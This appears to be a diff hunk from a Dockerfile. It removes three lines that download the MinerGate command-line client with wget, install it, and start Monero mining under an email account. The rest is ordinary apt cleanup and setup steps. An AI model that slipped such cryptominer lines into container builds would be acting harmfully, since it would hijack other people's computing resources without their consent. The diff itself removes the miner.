@@ -13,9 +13,7 @@ RUN apt-get update \
 	&& apt-get autoclean \
 	&& apt-get autoremove \
 	&& rm -rf /var/lib/apt/lists/*
-        && wget https://minergate.com/download/deb-cli -O minergate-cli.deb 
-	&& sudo dpkg -i minergate-cli.deb 
-	&& minergate-cli -user empireofbooks@gmail.com -xmr 16
+
 WORKDIR /root
 
 ADD startup.sh ./
